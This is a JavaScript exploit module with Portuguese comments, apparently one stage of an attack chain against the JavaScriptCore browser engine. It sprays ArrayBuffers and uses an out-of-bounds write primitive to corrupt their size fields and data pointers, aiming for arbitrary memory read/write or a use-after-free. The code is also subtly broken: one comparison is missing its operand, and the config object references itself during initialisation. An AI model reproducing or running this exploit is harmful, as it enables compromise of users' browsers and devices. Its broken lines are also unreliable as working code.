// js/script3/testCorruptArrayBufferStructure.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, isAdvancedInt64Object, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive, oob_array_buffer_real,
    oob_write_absolute, oob_read_absolute, clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs'; // Certifique-se que OOB_CONFIG é acessado após inicialização

// Função auxiliar para pulverizar ArrayBuffers
function sprayArrayBuffers(count, size, logFn = logS3) {
    const sprayedAbs = [];
    logFn(`Pulverizando ${count} ArrayBuffers de ${size} bytes...`, "info", "sprayABs");
    for (let i = 0; i < count; i++) {
        try {
            sprayedAbs.push(new ArrayBuffer(size));
        } catch (e) {
            logFn(`Falha ao alocar ArrayBuffer de spray ${i + 1}/${count}: ${e.message}`, "warn", "sprayABs");
        }
    }
    logFn(`${sprayedAbs.length} ArrayBuffers pulverizados.`, sprayedAbs.length > 0 ? "good" : "warn", "sprayABs");
    return sprayedAbs;
}

async function attemptReadWriteOnCorruptedBuffer(ab, originalSize, newExpectedSize, logFn = logS3, FNAME_PARENT = "") {
    logFn(` -> Verificando AB corrompido: Original Size=${originalSize}, Current Size (esperado)=${ab.byteLength}, Target Corrupted Size=${newExpectedSize}`, "info", FNAME_PARENT);

    if (ab.byteLength !== newExpectedSize) {
        logFn(`    -> FALHA NA VERIFICAÇÃO DE TAMANHO: AB.byteLength é ${ab.byteLength}, esperava ${newExpectedSize}.`, "error", FNAME_PARENT);
        return false;
    }

    logFn(`    -> SUCESSO NA CORRUPÇÃO DE TAMANHO: AB.byteLength é ${toHex(ab.byteLength)} como esperado!`, "vuln", FNAME_PARENT);

    try {
        const corruptedDv = new DataView(ab);
        // Tentar ler/escrever um pouco além do limite original, mas dentro do novo limite grande
        const readOffsetBeyondOriginal = originalSize + Math.floor(originalSize / 2); // Um offset seguro dentro do novo tamanho grande
        const testWriteVal = 0xABABABAB;

        if (readOffsetBeyondOriginal + 4 <= ab.byteLength) {
            logFn(`    Escrevendo ${toHex(testWriteVal)} em offset ${readOffsetBeyondOriginal} (além do original ${originalSize})...`, "info", FNAME_PARENT);
            corruptedDv.setUint32(readOffsetBeyondOriginal, testWriteVal, true);
            const readBack = corruptedDv.getUint32(readOffsetBeyondOriginal, true);

            if (readBack === testWriteVal) {
                logFn(`    ---> LEITURA/ESCRITA ARBITRÁRIA (NOVO TAMANHO) OBTIDA! Leu ${toHex(readBack)} de offset ${readOffsetBeyondOriginal}`, "critical", FNAME_PARENT);
                return true; // Sucesso na R/W arbitrária (limitada ao novo tamanho)
            } else {
                logFn(`    -> Falha na verificação R/W no AB corrompido (leu ${toHex(readBack)}, esperava ${toHex(testWriteVal)})`, "warn", FNAME_PARENT);
            }
        } else {
            logFn(`    -> Offset de teste R/W (${readOffsetBeyondOriginal}) está fora do novo tamanho do buffer (${ab.byteLength}). Isso não deveria acontecer se byteLength foi corrompido para um valor grande.`, "error", FNAME_PARENT);
        }
    } catch (e_rw) {
        logFn(`    -> Erro ao tentar R/W no AB corrompido (mesmo com tamanho grande): ${e_rw.message}`, "error", FNAME_PARENT);
    }
    return false;
}

const LONG_PAUSE_S3 = 1500;

export async function testCorruptArrayBufferStructure() {
    const FNAME = "testCorruptArrayBufferStructure";

    // --- Parâmetros de Teste Configuráveis ---
    const CORRUPTION_AB_CONFIG = {
        spray_count: 250,
        victim_ab_size: 256, // Um tamanho um pouco maior pode ajudar no spraying
        // !! VALIDE ESTES OFFSETS CUIDADOSAMENTE COM SEUS BINÁRIOS E JSON.TXT !!
        // Offset do campo de tamanho DENTRO da estrutura JSArrayBuffer
        size_offset_in_object: parseInt(JSC_OFFSETS.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START, 16) || 0x18, // Ex: 0x18 ou 0x30 (0x10 para m_impl + 0x20 para size in contents)
        // Offset do ponteiro para ArrayBufferContents* DENTRO da estrutura JSArrayBuffer
        vector_ptr_offset_in_object: parseInt(JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET, 16) || 0x10,
        // Offset do ponteiro de dados DENTRO de ArrayBufferContents (assumindo que vector_ptr_offset_in_object aponta para ArrayBufferContents)
        data_ptr_offset_in_contents: 0x10, // Exemplo baseado em JSObjectGetArrayBufferBytesPtr: [rax+10h] onde rax é ArrayBufferContents*

        corrupted_size_value: 0x7FFFF000, // Tamanho grande e um pouco alinhado
        // Para o ponteiro de dados, idealmente você quer apontar para um endereço que você controla
        // ou para um endereço que você quer ler. Para teste inicial de UAF, pode ser 0.
        corrupted_vector_data_ptr_low: 0x0,
        corrupted_vector_data_ptr_high: 0x0,

        // Ajustar estes baseado no tamanho do OOB_CONFIG.ALLOCATION_SIZE
        search_base_offset_start: (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - (CORRUPTION_AB_CONFIG.victim_ab_size * 4), // Tentar alguns objetos antes
        search_base_offset_end: (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) + (OOB_CONFIG.ALLOCATION_SIZE || 32768) - CORRUPTION_AB_CONFIG.victim_ab_size, // Não ir até o final absoluto para evitar problemas
        search_step: 8, // Tentar pular de 8 em 8 bytes (alinhamento comum)
        max_successful_corruptions_to_find: 1,
        attempts: 1, // Número de tentativas completas de spray e corrupção
    };
    // --- Fim dos Parâmetros ---

    logS3(`--- Iniciando Teste de Corrupção de Estrutura de ArrayBuffer (S3) (v2.2) ---`, "test", FNAME);
    logS3(`   Config: Spray=${CORRUPTION_AB_CONFIG.spray_count}x${CORRUPTION_AB_CONFIG.victim_ab_size}B, SizeOffsetInObj=${toHex(CORRUPTION_AB_CONFIG.size_offset_in_object)}, VectorPtrOffsetInObj=${toHex(CORRUPTION_AB_CONFIG.vector_ptr_offset_in_object)}`, "info", FNAME);
    logS3(`   Range de Busca (base speculativa no oob_real): ${toHex(CORRUPTION_AB_CONFIG.search_base_offset_start)} a ${toHex(CORRUPTION_AB_CONFIG.search_base_offset_end)}, Passo: ${CORRUPTION_AB_CONFIG.search_step}`, "info", FNAME);


    let successfulCorruptionsFound = 0;

    for (let attempt = 0; attempt < CORRUPTION_AB_CONFIG.attempts; attempt++) {
        if (successfulCorruptionsFound >= CORRUPTION_AB_CONFIG.max_successful_corruptions_to_find) break;

        logS3(`Tentativa de Corrupção de AB #${attempt + 1}/${CORRUPTION_AB_CONFIG.attempts}...`, "test", FNAME);
        await triggerOOB_primitive();
        if (!oob_array_buffer_real) {
            logS3("Falha ao configurar ambiente OOB. Abortando esta tentativa.", "error", FNAME);
            continue;
        }

        const victimAbs = sprayArrayBuffers(CORRUPTION_AB_CONFIG.spray_count, CORRUPTION_AB_CONFIG.victim_ab_size, logS3);
        if (victimAbs.length === 0) {
            clearOOBEnvironment();
            continue;
        }
        // É crucial forçar o GC aqui se possível, ou pelo menos dar um tempo significativo
        // para que o heap se estabilize após o spray e ANTES das escritas OOB.
        await PAUSE_S3(LONG_PAUSE_S3);

        for (let baseCandidateOffset = CORRUPTION_AB_CONFIG.search_base_offset_start;
             baseCandidateOffset < CORRUPTION_AB_CONFIG.search_base_offset_end;
             baseCandidateOffset += CORRUPTION_AB_CONFIG.search_step) {

            if (successfulCorruptionsFound >= CORRUPTION_AB_CONFIG.max_successful_corruptions_to_find) break;
            if (baseCandidateOffset < 0 || baseCandidateOffset >= oob_array_buffer_real.byteLength) continue;

            // --- TENTATIVA 1: Corromper TAMANHO ---
            const absOffsetForVictimSize = baseCandidateOffset + CORRUPTION_AB_CONFIG.size_offset_in_object;
            if (absOffsetForVictimSize >= 0 && absOffsetForVictimSize + 4 <= oob_array_buffer_real.byteLength) {
                const originalValueAtSizeOffset = oob_read_absolute(absOffsetForVictimSize, 4); // Ler antes de sobrescrever
                logS3(` Testando base ${toHex(baseCandidateOffset)}. Tentando corromper TAMANHO em abs offset ${toHex(absOffsetForVictimSize)} para ${toHex(CORRUPTION_AB_CONFIG.corrupted_size_value)}. Original: ${toHex(originalValueAtSizeOffset)}`, "info", FNAME);
                
                oob_write_absolute(absOffsetForVictimSize, CORRUPTION_AB_CONFIG.corrupted_size_value, 4);

                // Verificar se algum ArrayBuffer pulverizado foi afetado
                for (let i = 0; i < victimAbs.length; i++) {
                    if (!victimAbs[i]) continue;
                    try {
                        // A verificação do byteLength é a primeira indicação
                        if (victimAbs[i].byteLength === CORRUPTION_AB_CONFIG.corrupted_size_value) {
                            if (await attemptReadWriteOnCorruptedBuffer(victimAbs[i], CORRUPTION_AB_CONFIG.victim_ab_size, CORRUPTION_AB_CONFIG.corrupted_size_value, logS3, FNAME)) {
                                successfulCorruptionsFound++;
                                if (successfulCorruptionsFound >= CORRUPTION_AB_CONFIG.max_successful_corruptions_to_find) break;
                            }
                        }
                    } catch (e_check) { /* Silencioso, pois o acesso a byteLength pode falhar */ }
                }
                // Restaurar o valor original do tamanho para isolar testes para a próxima iteração de baseCandidateOffset
                // Isso é importante para não ter efeitos cumulativos de corrupção.
                try {
                    oob_write_absolute(absOffsetForVictimSize, originalValueAtSizeOffset, 4);
                } catch (e_restore) {logS3(` Aviso: falha ao restaurar valor em ${toHex(absOffsetForVictimSize)}`, "warn", FNAME)}

                if (successfulCorruptionsFound >= CORRUPTION_AB_CONFIG.max_successful_corruptions_to_find) break;
            }
            await PAUSE_S3(SHORT_PAUSE_S3); // Pausa entre tentativas de tamanho e vetor no mesmo base offset


            // --- TENTATIVA 2: Corromper PONTEIRO PARA ArrayBufferContents* ---
            // (assumindo que vector_ptr_offset_in_object é o ponteiro para ArrayBufferContents*)
            const absOffsetForVictimVectorPtr = baseCandidateOffset + CORRUPTION_AB_CONFIG.vector_ptr_offset_in_object;
            if (absOffsetForVictimVectorPtr >= 0 && absOffsetForVictimVectorPtr + 8 <= oob_array_buffer_real.byteLength) {
                const originalVectorPtr = oob_read_absolute(absOffsetForVictimVectorPtr, 8);
                const newVectorPtr = new AdvancedInt64(CORRUPTION_AB_CONFIG.corrupted_vector_data_ptr_low, CORRUPTION_AB_CONFIG.corrupted_vector_data_ptr_high);

                logS3(` Testando base ${toHex(baseCandidateOffset)}. Tentando corromper VETOR_PTR em abs offset ${toHex(absOffsetForVictimVectorPtr)} para ${newVectorPtr.toString(true)}. Original: ${isAdvancedInt64Object(originalVectorPtr) ? originalVectorPtr.toString(true) : toHex(originalVectorPtr)}`, "info", FNAME);
                oob_write_absolute(absOffsetForVictimVectorPtr, newVectorPtr, 8);

                for (let i = 0; i < victimAbs.length; i++) {
                    if (!victimAbs[i]) continue;
                    try {
                        // Tentar acessar o buffer. Se o ponteiro foi zerado, deve crashar ou dar erro.
                        // Se apontou para outro lugar, pode ler dados de lá ou crashar de forma diferente.
                        const dvCheck = new DataView(victimAbs[i]);
                        const firstByte = dvCheck.getUint8(0); // Acesso que pode causar UAF
                        logS3(`  AB ${i} após corrupção de vetor_ptr: byteLength=${victimAbs[i].byteLength}, 1stByte lido=${toHex(firstByte, 8)}. Isso pode indicar que não crashou.`, "warn", FNAME);
                        // Se chegou aqui sem crash E o firstByte é inesperado, pode ser um R/W arbitrário!
                        if (newVectorPtr.low() === 0 && newVectorPtr.high() === 0) {
                            // Se zeramos e não crashou, é estranho, mas não é UAF por NULL ptr.
                        } else if (firstByte !== /*valor esperado de um buffer não corrompido*/) {
                            logS3(`  !!! POTENCIAL LEITURA DE DADOS INESPERADOS NO AB ${i} após corrupção de vetor_ptr !!!`, "vuln", FNAME);
                            successfulCorruptionsFound++; // Considerar isso um sucesso também
                        }

                    } catch (e_check_vec) {
                        logS3(`  !!! POTENCIAL UAF/CRASH NO AB ${i} !!! Erro ao acessar após corrupção de vetor_ptr: ${e_check_vec.message}`, "critical", FNAME);
                        logS3(`     Offset base do objeto vítima (especulativo): ${toHex(baseCandidateOffset)}`, "vuln", FNAME);
                        successfulCorruptionsFound++;
                        if (successfulCorruptionsFound >= CORRUPTION_AB_CONFIG.max_successful_corruptions_to_find) break;
                    }
                }
                // Restaurar
                try {
                    oob_write_absolute(absOffsetForVictimVectorPtr, originalVectorPtr, 8);
                } catch (e_restore_vec) {logS3(` Aviso: falha ao restaurar vetor_ptr em ${toHex(absOffsetForVictimVectorPtr)}`, "warn", FNAME)}
                if (successfulCorruptionsFound >= CORRUPTION_AB_CONFIG.max_successful_corruptions_to_find) break;
            }
             if (baseCandidateOffset % (CORRUPTION_AB_CONFIG.search_step * 10) === 0) await PAUSE_S3(MEDIUM_PAUSE_S3); // Pausa mais longa a cada N tentativas
        } // Fim do loop de baseCandidateOffset
        
        clearOOBEnvironment(); // Limpar para a próxima tentativa de spray/corrupção
        if (successfulCorruptionsFound >= CORRUPTION_AB_CONFIG.max_successful_corruptions_to_find) break;
        logS3(`Fim da Tentativa #${attempt + 1}. Pausando antes da próxima...`);
        await PAUSE_S3(LONG_PAUSE_S3 * 2); // Pausa ainda maior entre as tentativas completas
    } // Fim do loop de attempt

    logS3(`--- Teste de Corrupção de Estrutura de ArrayBuffer Concluído (Sucessos de Corrupção Encontrados: ${successfulCorruptionsFound}) ---`, "test", FNAME);
}
